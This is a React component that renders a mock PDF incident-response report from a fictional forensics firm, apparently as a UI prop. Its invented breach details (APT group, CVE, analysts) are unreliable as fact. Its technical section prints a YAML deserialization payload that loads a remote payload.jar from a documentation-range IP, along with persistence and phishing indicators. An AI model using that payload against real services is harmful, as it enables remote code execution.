import React from 'react';

const IRReportPopup = ({ onClose }) => {
  return (
    <div id="ir-report-popup">
      <style>{`
        #ir-report-popup {
            font-family: 'Arial', 'Helvetica', sans-serif;
            width: 90vw;
            max-width: 1000px;
            color: #333;
        }

        #ir-report-popup * { margin: 0; padding: 0; box-sizing: border-box; }

        #ir-report-popup .report-window {
            width: 100%;
            height: 85vh;
            background: #525659; /* PDF viewer background color */
            border-radius: 8px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        /* Window Header */
        #ir-report-popup .window-header {
            background: #323639;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 16px;
            color: #f1f1f1;
            font-size: 13px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
            z-index: 10;
        }

        #ir-report-popup .window-title {
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 500;
        }

        #ir-report-popup .window-controls {
            display: flex;
            gap: 16px;
        }

        #ir-report-popup .control-icon {
            cursor: pointer;
            opacity: 0.7;
            transition: opacity 0.2s;
        }
        #ir-report-popup .control-icon:hover { opacity: 1; }

        /* Document Container */
        #ir-report-popup .document-container {
            flex: 1;
            overflow-y: auto;
            padding: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* The Paper */
        #ir-report-popup .paper {
            background: white;
            width: 100%;
            max-width: 700px;
            min-height: 900px; /* Make it look like a full page */
            padding: 60px 60px 100px 60px; /* Increased bottom padding for footer */
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            position: relative;
            margin-bottom: 40px; /* Increased margin for better page-break look */
            flex-shrink: 0; /* Prevent pages from squishing */
        }

        /* Report Header */
        #ir-report-popup .report-header {
            border-bottom: 2px solid #003366;
            padding-bottom: 20px;
            margin-bottom: 30px;
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
        }

        #ir-report-popup .company-branding h1 {
            color: #003366;
            font-size: 24px;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 5px;
        }

        #ir-report-popup .company-branding p {
            font-size: 11px;
            color: #666;
        }

        #ir-report-popup .report-meta {
            text-align: right;
            font-size: 12px;
            color: #444;
        }

        #ir-report-popup .report-meta div {
            margin-bottom: 4px;
        }

        #ir-report-popup .classification-banner {
            background: #ffebee;
            color: #c62828;
            border: 1px solid #ffcdd2;
            text-align: center;
            font-weight: bold;
            font-size: 12px;
            padding: 4px;
            margin-bottom: 30px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }

        /* Content Typography */
        #ir-report-popup h2 {
            color: #2c3e50;
            font-size: 18px;
            border-bottom: 1px solid #eee;
            padding-bottom: 8px;
            margin-top: 25px;
            margin-bottom: 15px;
        }

        #ir-report-popup h3 {
            color: #34495e;
            font-size: 14px;
            margin-top: 15px;
            margin-bottom: 8px;
        }

        #ir-report-popup p {
            font-size: 12px;
            line-height: 1.6;
            margin-bottom: 12px;
            color: #333;
            text-align: justify;
        }

        #ir-report-popup ul {
            margin-left: 20px;
            margin-bottom: 15px;
        }

        #ir-report-popup li {
            font-size: 12px;
            line-height: 1.5;
            margin-bottom: 6px;
            color: #333;
        }

        /* Technical Data Table */
        #ir-report-popup .data-table {
            width: 100%;
            border-collapse: collapse;
            margin: 15px 0;
            font-size: 11px;
            font-family: 'Consolas', 'Monaco', monospace;
        }

        #ir-report-popup .data-table th {
            background: #f5f7fa;
            border: 1px solid #e1e4e8;
            padding: 8px;
            text-align: left;
            color: #555;
        }

        #ir-report-popup .data-table td {
            border: 1px solid #e1e4e8;
            padding: 8px;
            color: #333;
        }

        /* Footer */
        #ir-report-popup .paper-footer {
            position: absolute;
            bottom: 40px;
            left: 60px;
            right: 60px;
            border-top: 1px solid #ddd;
            padding-top: 10px;
            display: flex;
            justify-content: space-between;
            font-size: 10px;
            color: #999;
        }

        #ir-report-popup .signature-block {
            margin-top: 40px;
            display: flex;
            justify-content: space-between;
        }

        #ir-report-popup .signature-line {
            width: 200px;
            border-top: 1px solid #333;
            padding-top: 5px;
            font-size: 11px;
            color: #333;
        }

        #ir-report-popup .code-snippet {
            background: #f8f9fa;
            border: 1px solid #e9ecef;
            padding: 10px;
            font-family: 'Courier New', monospace;
            font-size: 10px;
            color: #d63384;
            margin-bottom: 15px;
            white-space: pre-wrap;
        }

      `}</style>
      <div className="report-window">
        {/* PDF Viewer Header */}
        <div className="window-header">
            <div className="window-title">
                <i className="ph ph-file-pdf" style={{marginRight: '6px', color: '#ff5555'}}></i>
                FINAL_IR_Report_2026-0892_v2.pdf
            </div>
            <div className="window-controls">
                <div className="control-icon" onClick={onClose}><i className="ph ph-printer"></i></div>
                <div className="control-icon" onClick={onClose}><i className="ph ph-download-simple"></i></div>
                <div className="control-icon" onClick={onClose} style={{marginLeft: '10px'}}><i className="ph ph-x"></i></div>
            </div>
        </div>

        <div className="document-container">
            {/* Page 1 */}
            <div className="paper">
                <div className="classification-banner">
                    TLP:RED // CONFIDENTIAL // DO NOT DISTRIBUTE
                </div>

                <div className="report-header">
                    <div className="company-branding">
                        <h1>Aegis Forensics</h1>
                        <p>Global Incident Response & Cyber Risk Management</p>
                        <p>101 Cyber Way, Arlington, VA 22209</p>
                    </div>
                    <div className="report-meta">
                        <div><strong>Incident ID:</strong> IR-2026-0892</div>
                        <div><strong>Date:</strong> January 15, 2026</div>
                        <div><strong>Client Ref:</strong> CYTAC-001</div>
                        <div><strong>Status:</strong> <span style={{color: '#c62828', fontWeight: 'bold'}}>CRITICAL</span></div>
                    </div>
                </div>

                <h2>1. Executive Summary</h2>
                <p>
                    On January 12, 2026, at approximately 04:15 UTC, Aegis Forensics was engaged to investigate a suspected security breach involving unauthorized access to critical infrastructure control systems. Initial triage confirms that threat actors successfully leveraged a zero-day vulnerability in the edge routing firmware (CVE-2025-9982) to bypass perimeter defenses.
                </p>
                <p>
                    The attackers demonstrated advanced persistence mechanisms and lateral movement capabilities, accessing sensitive operational data stores. Data exfiltration of approximately 4.2TB has been confirmed. The threat actor's TTPs (Tactics, Techniques, and Procedures) align with the state-sponsored group known as "APT-292" (aka "ShadowBear").
                </p>

                <h2>2. Technical Analysis</h2>
                <h3>2.1 Initial Access & Persistence</h3>
                <p>
                    Forensic analysis of the firewall logs identified an anomalous inbound connection from IP address <code>198.51.100.45</code> originating from a VPS hosted in Eastern Europe. The attackers executed a remote code execution (RCE) payload which established a reverse shell.
                </p>
                
                <div className="code-snippet">
&gt; POST /api/v1/router/config HTTP/1.1
&gt; Host: internal-gw
&gt; Content-Type: application/x-yaml
&gt; 
&gt; !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://198.51.100.45/payload.jar"]]]]
                </div>

                <p>
                    Upon gaining access, a rootkit identified as "GhostMod" was installed in <code>/usr/lib/modules</code> to hide malicious processes from standard monitoring tools.
                </p>

                <h3>2.2 Indicators of Compromise (IOCs)</h3>
                <table className="data-table">
                    <thead>
                        <tr>
                            <th>Type</th>
                            <th>Value</th>
                            <th>Context</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>File Hash (SHA256)</td>
                            <td>a1b2c3d4e5f6...998877</td>
                            <td>Payload.jar (Stage 1 Dropper)</td>
                        </tr>
                        <tr>
                            <td>IP Address</td>
                            <td>198.51.100.45</td>
                            <td>C2 Server (Primary)</td>
                        </tr>
                        <tr>
                            <td>Registry Key</td>
                            <td>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater</td>
                            <td>Persistence Mechanism</td>
                        </tr>
                        <tr>
                            <td>Domain</td>
                            <td>update-microsoft-support.com</td>
                            <td>Phishing Domain</td>
                        </tr>
                    </tbody>
                </table>
                <div className="paper-footer">
                    <span>Aegis Forensics | Incident Response Report</span>
                    <span>Page 1 of 2</span>
                    <span>CONFIDENTIAL</span>
                </div>
            </div>

            {/* Page 2 */}
            <div className="paper">
                <div className="classification-banner">
                    TLP:RED // CONFIDENTIAL // DO NOT DISTRIBUTE
                </div>

                <h2>3. Impact Assessment</h2>
                <p>
                    The compromise resulted in the encryption of 45% of the virtualization cluster. While backups were targeted, the off-site immutable storage remained intact, allowing for a projected recovery time of 48-72 hours. However, the exfiltrated data contains PII (Personally Identifiable Information) of 15,000 employees and proprietary source code.
                </p>

                <h2>4. Recommendations</h2>
                <ul>
                    <li><strong>Immediate:</strong> Isolate VLANs 10, 20, and 50. Reset all administrative credentials, specifically for Service Accounts.</li>
                    <li><strong>Short-term:</strong> Patch all edge devices to firmware version 4.5.2 immediately to mitigate CVE-2025-9982. Deploy EDR agents to all unmanaged Linux endpoints.</li>
                    <li><strong>Long-term:</strong> Implement a Zero Trust Network Architecture (ZTNA) and conduct a full code audit of proprietary applications.</li>
                </ul>

                <div className="signature-block">
                    <div className="signature-line">
                        <strong>Sarah Jenkins</strong><br/>
                        Lead Forensic Analyst<br/>
                        CISSP, GCFA, GCIH
                    </div>
                    <div className="signature-line">
                        <strong>David Chen</strong><br/>
                        Director of Incident Response
                    </div>
                </div>

                <div className="paper-footer">
                    <span>Aegis Forensics | Incident Response Report</span>
                    <span>Page 2 of 2</span>
                    <span>CONFIDENTIAL</span>
                </div>
            </div>
        </div>
      </div>
    </div>
  );
};

export default IRReportPopup;
